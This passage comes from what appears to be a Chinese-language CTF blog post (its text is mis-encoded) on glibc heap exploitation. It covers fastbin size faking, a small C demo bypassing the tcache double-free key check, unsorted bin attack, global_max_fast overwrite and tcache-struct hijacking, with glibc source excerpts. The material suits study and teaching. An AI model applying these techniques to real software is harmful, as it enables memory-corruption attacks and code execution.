<pre class="line-numbers language-c" data-language="c"><code class="language-c">Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x30</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">]</span>
Fastbins<span class="token punctuation">[</span>idx<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x70</span><span class="token punctuation">]</span>
<span class="token comment">//è¿™é‡Œçš„sizeä¸åŒ…æ‹¬chunkå¤´</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>idxå®é™…ä¸Šæ˜¯<code>main_arena</code>æ‰¾ç›¸åº”çš„fasbinçš„ä¸€ç§æ–¹æ³•å§ï¼Œåœ¨è¿›è¡Œfdä¿®æ”¹çš„æ—¶å€™ï¼Œè¦ä¼ªé€ sizeï¼Œè€Œè¿™é‡Œå°±å¯ä»¥çœ‹ä¸‹æ€ä¹ˆè®©å¤§å°åœ¨fastbinå†…</p>
<p>ç¨‹åºæ˜¯ 64 ä½çš„ï¼Œå› æ­¤ fastbin çš„èŒƒå›´ä¸º 32 å­—èŠ‚åˆ° 128 å­—èŠ‚ (0x20-0x80)</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">##define <span class="token function">fastbin_index</span><span class="token punctuation">(</span>sz<span class="token punctuation">)</span>                                                      \
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token punctuation">(</span>SIZE_SZ <span class="token operator">==</span> <span class="token number">8</span> <span class="token operator">?</span> <span class="token number">4</span> <span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>æ‰€ä»¥è¯´ï¼Œå®é™…ä¸Š0x7fæ˜¯åœ¨idx=5çš„chunkï¼Œ0x7f&gt;&gt;4 = 7 7-2 = 5</p>
<p>å°†fastbinåˆ†é…åˆ°<code>__malloc_hook</code>æˆ–è€…<code>__free_hook</code>çš„æ—¶å€™ï¼Œè¦æ³¨æ„è¿™ä¸ªï¼Œè¦å»çœ‹hooké™„è¿‘æœ‰æ²¡æœ‰å¯ä»¥é”™ä½çš„å¤§å°ã€‚</p>
<p>æœ€åfastbin attackå…¶å®ç›®çš„å°±åœ¨äº<strong>è·å¾—</strong>fdçš„æ§åˆ¶æƒé™ã€‚ä¹Ÿå°±æ˜¯chunkçš„ä»»æ„åˆ†é…ã€‚</p>
<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><p>tcache ä¹Ÿå¯ä»¥double free è€Œä¸”åœ¨æ—©æœŸçš„libc2.27ä»¥å‰ï¼Œå¯ä»¥è¯´æ˜¯æ¨ªè¡Œéœ¸é“ï¼Œåº”ä¸ºå¯ä»¥ç›´æ¥å¤šæ¬¡freeæ²¡æœ‰ä»»ä½•çš„ä¿æŠ¤æœºåˆ¶ã€‚åæ¥libcç»è¿‡å‡çº§ä¹‹åï¼Œå¢åŠ äº†ä¸€äº›ä¿æŠ¤æœºåˆ¶ã€‚</p>
<p>malloc.c-&gt;2904è¡Œ</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">tcache_entry</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">struct</span> <span class="token class-name">tcache_entry</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>
  <span class="token comment">/* This field exists to detect double frees.  */</span>
  <span class="token keyword">struct</span> <span class="token class-name">tcache_perthread_struct</span> <span class="token operator">*</span>key<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> tcache_entry<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¦‚æºç ï¼Œtcacheç»“æ„ä½“æ·»åŠ äº†ä¸€ä¸ªkeyå­—æ®µæ¥é˜²æ­¢double freesã€‚</p>
<p>malloc.c-&gt;4189è¡Œ</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">USE_TCACHE</span></span>
  <span class="token punctuation">&#123;</span>
    <span class="token class-name">size_t</span> tc_idx <span class="token operator">=</span> <span class="token function">csize2tidx</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>tcache <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> tc_idx <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_bins<span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
	<span class="token comment">/* Check to see if it's already in the tcache.  */</span>
	tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token punctuation">(</span>tcache_entry <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* This test succeeds on double free.  However, we don't 100%
	   trust it (it also matches random payload data at a 1 in
	   2^&lt;size_t> chance), so verify it's not an unlikely
	   coincidence before aborting.  */</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>key <span class="token operator">==</span> tcache<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//å¦‚æœè¦freeçš„å—çš„keyä¸tcacheç›¸ç­‰</span>
	  <span class="token punctuation">&#123;</span>
	    tcache_entry <span class="token operator">*</span>tmp<span class="token punctuation">;</span>
	    <span class="token function">LIBC_PROBE</span> <span class="token punctuation">(</span>memory_tcache_double_free<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
	    <span class="token keyword">for</span> <span class="token punctuation">(</span>tmp <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
		 tmp<span class="token punctuation">;</span>
		 tmp <span class="token operator">=</span> tmp<span class="token operator">-></span>next<span class="token punctuation">)</span><span class="token comment">//å¾ªç¯æ‰€æœ‰keyç›¸ç­‰çš„å—</span>
	      <span class="token keyword">if</span> <span class="token punctuation">(</span>tmp <span class="token operator">==</span> e<span class="token punctuation">)</span><span class="token comment">//å¦‚æœæœ‰å—ç­‰äºè¦freeçš„å—</span>
		<span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"free(): double free detected in tcache 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æŠ¥é”™ï¼Œdouble free</span>
	    <span class="token comment">/* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */</span>
	  <span class="token punctuation">&#125;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token punctuation">)</span>
	  <span class="token punctuation">&#123;</span>
	    <span class="token function">tcache_put</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
	    <span class="token keyword">return</span><span class="token punctuation">;</span>
	  <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¤§æ¦‚æ„æ€å°±æ˜¯tcacheæœ‰ä¸ªkeyï¼Œå¦‚æœä½ è¦å»freeä¸€ä¸ªchunkï¼Œé‚£ä¹ˆå°±ä¼šåˆ¤æ–­ï¼Œè¿™ä¸ªchunkæ˜¯ä¸æ˜¯tcacheï¼Œå¦‚æœkeyå’Œtcacheç›¸ç­‰å°±ä¼šéå†æ‰€æœ‰keyç›¸ç­‰çš„chunkï¼Œå¦‚æœæœ‰ç›¸ç­‰çš„ï¼Œå°±ä¼šçˆ†å‡ºdouble freeçš„é”™è¯¯ã€‚ä½†æ˜¯ï¼Œå½“æˆ‘ä»¬æœ‰UAFçš„æ—¶å€™ï¼Œå¯ä»¥è½»æ¾ç»•è¿‡ã€‚</p>
<p>poc</p>
<pre class="line-numbers language-none"><code class="language-none">1 malloc
2 free
3 ä¿®æ”¹keyå­—æ®µä¸ºåˆ«çš„å€¼ã€‚
4 å†æ¬¡free<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™é‡Œæ‹¿ä¸€ä¸ªå¸ˆå‚…çš„demoæ¥åšä¾‹å­</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token class-name">size_t</span> <span class="token operator">*</span>ptr1<span class="token punctuation">,</span>ptx<span class="token punctuation">;</span>
	ptr1<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//freeä¸€ä¸ªchunk</span>

	<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åªæ˜¯ä¸ºäº†æ‰“æ–­ç‚¹ï¼Œæ²¡åˆ«çš„ç”¨ã€‚</span>
	ptx<span class="token operator">=</span>ptr1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"prt1[1]=>0x%llx"</span><span class="token punctuation">,</span>ptx<span class="token punctuation">)</span><span class="token punctuation">;</span>
	ptr1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>ptx<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token comment">//å°†chunkçš„keyçš„å€¼-8;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æµ‹è¯•</span>
	<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸ä¸€å®šè¦å‡å»8ï¼Œåªè¦ä¸æ˜¯ç°åœ¨è¿™ä¸ªéƒ½å¯ä»¥ã€‚</p>
<p>ç„¶åè°ƒè¯•å‘ç°ï¼Œptr1[1]è¿™ä¸ªä½ç½®å¥½åƒæ˜¯tachebinå­˜å‚¨idxçš„åœ°æ–¹ã€‚ç„¶åçš„è¯ï¼Œæ„æˆåŒå‘é“¾è¡¨ä¹‹åï¼Œshowå‡½æ•°æ˜¯å¾ˆå¥½å»æ³„éœ²å †åœ°å€çš„ï¼Œæ³„éœ²å †åœ°å€ä¹‹å<strong>æˆ‘ä¹Ÿä¸çŸ¥é“å¹²å•¥</strong></p>
<p>æœ‰äº†ï¼Œï¼Œï¼Œï¼Œtcacheä¸­ï¼Œç¬¬ä¸€æ¬¡ç”³è¯·tcacheä¹‹åï¼Œä¼šå…ˆç”³è¯·ä¸€ä¸ª0x250å¤§å°çš„chunkï¼Œè®°å½•æ¯ä¸ªtcache bin é“¾è¡¨çš„ä¿¡æ¯ã€‚double freeå½¢æˆä¹‹åï¼Œåˆ©ç”¨fdæŒ‡é’ˆï¼ŒæŠŠå †ç”³è¯·åˆ°è¿™ä¸ª0x250çš„chunkå»ï¼Œç„¶åä¿®æ”¹tcache binçš„ä¿¡æ¯ï¼Œè®©æŸä¸ªé“¾è¡¨å˜æ»¡ï¼Œç„¶åå†æ¬¡freeåŒå¤§å°çš„chunkå°±å¯ä»¥freeè¿›å»unsorted binäº†ã€‚</p>
<p><strong>æ­¤å¤–</strong>è¿˜æœ‰ä¸€ç§æ–¹æ³•ç»•è¿‡ï¼Œdouble freeä¹‹å mallocä¸‰æ¬¡ï¼Œtcacheçš„è®°å½•å°±æ˜¯-1ï¼Œç„¶åå†æ¬¡freeåŒå¤§å°çš„chunkå°±ä¼šfreeè¿›å»unsorted binã€‚</p>
<h2 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h2><p>unsorted binå¤šç”¨æ¥æ³„éœ²åœ°å€ï¼Œä½†ä¹Ÿæœ‰åˆ«çš„ç”¨æ³•ï¼Œå…³äºunsorted biné¦–å…ˆï¼Œå¯ä»¥å’Œ<code>top chunk</code>åˆå¹¶ï¼Œç„¶åå€¼å¾—æ³¨æ„çš„æ˜¯</p>
<p><strong>ç›¸åŒsizeçš„chunkè¿›å…¥unsortedbinä¼šè¿›è¡Œåˆå¹¶</strong></p>
<p>è€ƒè™‘åˆ°å½“æˆ‘ä»¬å°† tcache struct é€å…¥ unsorted bin ä¸­ä¹‹åï¼Œå…¶ä¸Šä¼šæ®‹ç•™ main_arena é™„è¿‘ çš„æŒ‡é’ˆï¼Œè€Œè¿™ä¸ªæŒ‡é’ˆå’Œ <code>stdout</code> ç¦»å¾—å¾ˆè¿‘</p>
<p>å¯ä»¥åˆ©ç”¨unsorted bin çš„åˆ‡å‰²æ‹¿åˆ°stdouté™„è¿‘çš„æŒ‡é’ˆï¼Œä»è€Œå¯¹å…¶åŠ«æŒã€‚</p>
<p><strong>æ­¤å¤–</strong>unsorted chunkä¼šå’Œtopchunkåˆå¹¶ï¼Œå…ˆè¿›å…ˆå‡ºï¼Œä»å¤´éƒ¨æ“ä½œã€‚æ³„éœ²main_arenaçš„è¯ï¼Œå¯ä»¥æŸ¥çœ‹libcé‡Œé¢<code>malloc_trim</code>çš„åœ°å€ï¼Œæˆ–è€…åˆ©ç”¨<code>malloc_hook</code>ç®—å‡ºæ¥ï¼Œ</p>
<p><code>main_arena_offset = ELF(&quot;libc.so.6&quot;).symbols[&quot;__malloc_hook&quot;] + 0x10</code></p>
<p>è®¿é—®é“¾è¡¨å°¾å¯ä»¥è·å¾—fdå°±å¯ä»¥æ³„éœ²libcï¼Œä½†æ˜¯ï¼Œå¦‚æœæ˜¯é“¾è¡¨å¤´çš„è¯printfåœ¨64ä½å¾€å¾€ä¼šè¢«æˆªæ–­ã€‚</p>
<h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>mallocæœ‰ä¸€æ®µè¿™æ ·çš„ä»£ç ï¼Œ</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* remove from unsorted list */</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>fd <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): corrupted unsorted chunks 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
bck<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç±»ä¼¼äºunlinkçš„è§£é“¾æ“ä½œã€‚è€Œ</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    bck <span class="token operator">=</span> victim<span class="token operator">-></span>bk<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span><span class="token punctuation">(</span><span class="token function">chunksize_nomask</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span>
        <span class="token function">__builtin_expect</span><span class="token punctuation">(</span><span class="token function">chunksize_nomask</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span> <span class="token operator">></span> av<span class="token operator">-></span>system_mem<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token function">malloc_printerr</span><span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"malloc(): memory corruption"</span><span class="token punctuation">,</span>
                        <span class="token function">chunk2mem</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>
    size <span class="token operator">=</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/*
       If a small request, try to use last remainder if it is the
       only chunk in unsorted bin.  This helps promote locality for
       runs of consecutive small requests. This is the only
       exception to best-fit, and applies only when there is
       no exact fit for a small chunk.
     */</span>
    <span class="token comment">/* æ˜¾ç„¶ï¼Œbckè¢«ä¿®æ”¹ï¼Œå¹¶ä¸ç¬¦åˆè¿™é‡Œçš„è¦æ±‚*/</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_smallbin_rage</span><span class="token punctuation">(</span>nb<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> bck <span class="token operator">==</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
        victim <span class="token operator">==</span> av<span class="token operator">-></span>last_remainder <span class="token operator">&amp;&amp;</span>
        <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb <span class="token operator">+</span> MINSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">/* remove from unsorted list */</span>
    <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
    bck<span class="token operator">-></span>fd                 <span class="token operator">=</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸éš¾å‘ç°ï¼Œåœ¨unsorted chunkè§£é“¾çš„è¿‡ç¨‹ä¸­ï¼Œvictimçš„fdä¼¼ä¹æ²¡æœ‰ä»»ä½•ä½œç”¨ï¼Œæ‰€ä»¥å¯ä»¥æ§åˆ¶fdï¼Œç„¶åæŒ‡å‘ä¸€ä¸ªä½ç½®ï¼Œåˆ©ç”¨è§£é“¾æ“ä½œå°±å¯ä»¥å®ç°attackï¼Œè¿™é‡Œç¡®å®å¯ä»¥å’Œ<code>off_by_one</code>å½¢æˆä¸€äº›<code>unlink</code>æ”»å‡»ï¼Œåˆ©ç”¨çš„æ˜¯mallocçš„æ—¶å€™ï¼Œå›å»unsorted biné‡Œé¢ä¸€ä¸ªä¸€ä¸ªçš„å¯»æ‰¾chunkï¼Œå¦‚æœä¸ç¬¦åˆå°±è§£é“¾æŠŠchunké€åˆ°åˆé€‚çš„biné‡Œé¢å»ã€‚</p>
<p>ä½†æ˜¯è¿™é‡Œå†™å…¥çš„æ˜¯ä¸€ä¸ªåœ°å€ï¼Œå°±æ˜¯å¯ä»¥ç»™ä¸€ä¸ªåœ°å€å†™å…¥ä¸€ä¸ªè¶…çº§å¤§çš„å˜é‡ï¼Œä½†æ˜¯æˆ‘ä»¬æ— æ³•æ§åˆ¶è¿™ä¸€å—åœ°å€ã€‚</p>
<h3 id="ç‰¹æ®Šåˆ©ç”¨"><a href="#ç‰¹æ®Šåˆ©ç”¨" class="headerlink" title="ç‰¹æ®Šåˆ©ç”¨"></a>ç‰¹æ®Šåˆ©ç”¨</h3><p>åˆ©ç”¨ unsorted bin attack ï¼Œä¿®æ”¹ global_max_fast å…¨å±€å˜é‡ï¼Œç”±äº global_max_fast  å˜é‡ä¸ºæ§åˆ¶æœ€å¤§çš„ Fast chunk çš„å¤§å°ï¼Œå°†è¿™é‡Œæ”¹å†™ä¸º unsorted bin çš„åœ°å€ (ä¸€èˆ¬æ¥è¯´æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ­£æ•°)ï¼Œå°±èƒ½ä½¿ä¹‹åçš„  chunk éƒ½è¢«å½“ä½œ fast chunkï¼Œå³å¯è¿›è¡Œ Fast bin attackã€‚</p>
<h2 id="tcache-ç®¡ç†å™¨çš„åˆ©ç”¨"><a href="#tcache-ç®¡ç†å™¨çš„åˆ©ç”¨" class="headerlink" title="tcache ç®¡ç†å™¨çš„åˆ©ç”¨"></a>tcache ç®¡ç†å™¨çš„åˆ©ç”¨</h2><p><img src="https://i.bmp.ovh/imgs/2021/05/6614988d4c0429fe.png" loading="lazy"></p>
<p>åˆ†æçŸ¥é“ï¼Œä»å¯¹ç®¡ç†å™¨chunkçš„fdå¼€å§‹æ¯ä¸ªå­—èŠ‚ä»£è¡¨ä¸€ä¸ªå¤§å°çš„tcache,ä»0x20å¼€å§‹ä¸€å…±64ä¸ªå­—èŠ‚ï¼Œ64ä¸ªtcacheé“¾ï¼Œç„¶åæ¯ä¸ªé“¾è¡¨çš„å¤´éƒ½ä¼šè®°å½•åœ¨è¿™ä¸ªç®¡ç†å™¨é‡Œé¢ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨uafç­‰æ¼æ´ï¼ŒæŠŠchunkåˆ†é…åˆ°è¿™ä¸Šé¢æ¥ï¼Œä»è€Œæ§åˆ¶tcache_entryã€‚</p>
<p>å…³äº<code>libc2.32ä¸­</code>tcacheç®¡ç†å™¨çš„ä¸åŒï¼Œ</p>
<p><strong>åœ¨libc2.27ä¸­</strong>ï¼Œtcacheç®¡ç†å™¨åªæœ‰0x250çš„å¤§å°ï¼Œç„¶åtcacheçš„fdä»€ä¹ˆçš„ä¹Ÿç±»ä¼¼fastbinï¼Œä½†æ˜¯è°ƒè¯•ffçš„æ—¶å€™å‘ç°ï¼Œfdéå¸¸çš„æ··ä¹±ï¼Œä½†æ˜¯heapinfo(pwngdb)å’Œfdæ˜¾ç¤ºçš„å†…å®¹ä¸ä¸€æ ·ï¼Œæˆ‘å°±æƒ³çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæ‰¾äº†ä¸€äº›èµ„æ–™ã€‚</p>
<p><strong>libc2.32</strong>ä¸­çš„tcacheç®¡ç†å™¨å¤§å°æ˜¯0x290ï¼Œå¤šäº†0x40ã€‚å…ˆä¸çœ‹è¿™é‡Œï¼Œé‚£ä¸ºä»€ä¹ˆfdä¸æ˜¯æˆ‘ä»¬æœŸæœ›çš„å€¼å‘¢ï¼Ÿ</p>
<p>çœ‹ä¸‹é¢<code>libc2.32</code>æ–°å¢çš„ä¿æŠ¤ï¼ˆ<code>glibc2.31</code>ä»¥ä¸‹æ²¡æœ‰ï¼‰</p>
<h4 id="glibc-2-32ä¸‹çš„-tcache-put-ä¸-tcache-get"><a href="#glibc-2-32ä¸‹çš„-tcache-put-ä¸-tcache-get" class="headerlink" title="glibc 2.32ä¸‹çš„ tcache_put ä¸ tcache_get"></a>glibc 2.32ä¸‹çš„ tcache_put ä¸ tcache_get</h4><p>åœ¨tcacheå–å‡ºå’Œå­˜æ”¾çš„æ—¶å€™åŠ äº†ä¸€å±‚ä¿æŠ¤ï¼Œåœ¨ <code>glibc 2.32</code> ä¸­å¼•å…¥äº†ä¸€ä¸ªç®€å•çš„å¼‚æˆ–åŠ å¯†æœºåˆ¶ï¼š</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Caller must ensure that we know tc_idx is valid and there's room
for more chunks.  */</span>
<span class="token keyword">static</span> __always_inline <span class="token keyword">void</span>
<span class="token function">tcache_put</span> <span class="token punctuation">(</span>mchunkptr chunk<span class="token punctuation">,</span> <span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token punctuation">(</span>tcache_entry <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/* Mark this chunk as "in the tcache" so the test in _int_free will
  detect a double free.  */</span>
e<span class="token operator">-></span>key <span class="token operator">=</span> tcache<span class="token punctuation">;</span>

e<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token function">PROTECT_PTR</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>e<span class="token operator">-></span>next<span class="token punctuation">,</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>
<span class="token operator">++</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">/* Caller must ensure that we know tc_idx is valid and there's
available chunks to remove.  */</span>
<span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token operator">*</span>
<span class="token function">tcache_get</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">aligned_OK</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): unaligned tcache chunk detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
